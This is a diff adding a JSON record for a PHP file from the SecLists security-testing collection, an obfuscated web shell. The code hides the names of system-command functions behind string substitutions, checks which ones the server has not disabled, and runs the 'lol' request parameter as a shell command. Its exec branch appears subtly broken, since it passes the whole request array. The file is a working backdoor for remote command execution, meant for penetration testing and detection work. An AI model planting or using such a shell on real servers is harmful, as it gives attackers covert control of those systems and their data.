@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/PHP/another-obfuscated-phpshell.php",
+  "title": "danielmiessler/SecLists/Web-Shells/PHP/another-obfuscated-phpshell.php",
+  "text": "<?php // Usage example: GET /another_obfuscated_phpshell.php?lol=ls%20-al\n$S=array(m(\"ncoai\",\"msyte\", \"cocain\"),m(\"sir\",\"cex\",\"iris\"),m(\"otab\",\"lshe\",\"taboo\").\"_\".m(\"sir\",\"cex\",\"iris\"),m(\"gbledin\",\"upasthr\",\"bleeding\"));\n$TR=m(\"etroubl\",\"edisabl\",\"trouble\");$MK=m(\"dpreambl\",\"sfunctio\",\"preambled\");$D=explode(\",\",ini_get($TR.'_'.$MK));$P=$_REQUEST;\nfunction m($a,$b,$c) {return str_replace(str_split($a), str_split($b), $c);}\nforeach($S as $A) {\n    if(!in_array($A, $D)) {\n        if($A == m(\"ncoai\",\"msyte\",\"cocain\")) $A($P['lol']);\n        elseif($A == m(\"sir\",\"cex\",\"iris\")) {\n            exec(\"$P 2>&1\", $arr);\n            echo join(\"\\n\",$arr).\"\\n\";\n        } else echo $A($P['lol']);\n        exit;\n    }\n}",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/PHP/another-obfuscated-phpshell.php",
+  "language": "php",
+  "kind": "code"
+}
